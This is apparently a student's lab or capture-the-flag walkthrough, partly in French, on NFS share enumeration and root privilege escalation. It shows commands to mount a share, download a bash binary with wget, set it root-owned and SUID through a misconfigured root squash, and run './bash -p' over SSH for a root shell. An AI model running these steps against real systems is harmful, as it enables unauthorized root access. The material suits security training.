# Network File System

Allows to share file and directories over the internet  
Available with Windows or Unix OS  
It uses Mounting and file handle 


### List shares
```bash
showmount -e [Target-IP] 
```

### Mounting NFS shares

***Example : ***
Your client’s system needs a directory where all the content shared by the host server in the export folder can be accessed. You can create this folder anywhere on your system. Once you've created this mount point, you can use the "mount" command to connect the NFS share to the mount point on your machine like so:

```bash
sudo mount -t nfs [Target-IP]:/share/directory /tmp/mount/ -nolock
```


|Tag	| Function |
|:------|----------|
|sudo	|Run as root|
|mount	|Execute the mount command|
|-t nfs	|Type of device to mount, then specifying that it's NFS|
|IP:share	|The IP Address of the NFS server, and the name of the share we wish to mount|
|-nolock	|Specifies not to use NLM locking|








fichier bash pour le root shell :
```bash
wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash.
```

### Mapped Out Pathway:

If this is still hard to follow, here's a step by step of the actions we're taking, and how they all tie together to allow us to gain a root shell:


- NFS Access

    - Gain Low Privilege Shell

        - Upload Bash Executable to the NFS share

            - Set SUID Permissions Through NFS Due To Misconfigured Root Squash

                - Login through SSH

                    - Execute SUID Bit Bash Executable

                        - ROOT ACCESS

Lets do this! Get root access

1. : On télécharge le fichier bash et on le déplace à l'endroit du partage 
2. : on set les permissions de root : sudo chown root bash
3. : On set les permissions de SUID : sudo chmod +s bash		et ->  sudo chmod +x bash
4. : on log avec le ssh qu'on à trouvé avant et on execute le fichier avec ./bash -p
le -p permet de ne pas perdre les permissions de temps en temps

### Let's try

1. First, change directory to the mount point on your machine, where the NFS share should still be mounted, and then into the user's home directory.


2. Download the bash executable to your Downloads directory. Then use "cp ~/Downloads/bash ." to copy the bash executable to the NFS share. The copied bash shell must be owned by a root user, you can set this using "sudo chown root bash"


3. Now, we're going to add the SUID bit permission to the bash executable we just copied to the share using "sudo chmod +[permission] bash". What letter do we use to set the SUID bit set using chmod?


4. Let's do a sanity check, let's check the permissions of the "bash" executable using "ls -la bash". What does the permission set look like? Make sure that it ends with -sr-x.

5. Now, SSH into the machine as the user. List the directory to make sure the bash executable is there. Now, the moment of truth. Lets run it with "./bash -p". The -p persists the permissions, so that it can run as root with SUID- as otherwise bash will sometimes drop the permissions.


5. Great! If all's gone well you should have a shell as root!





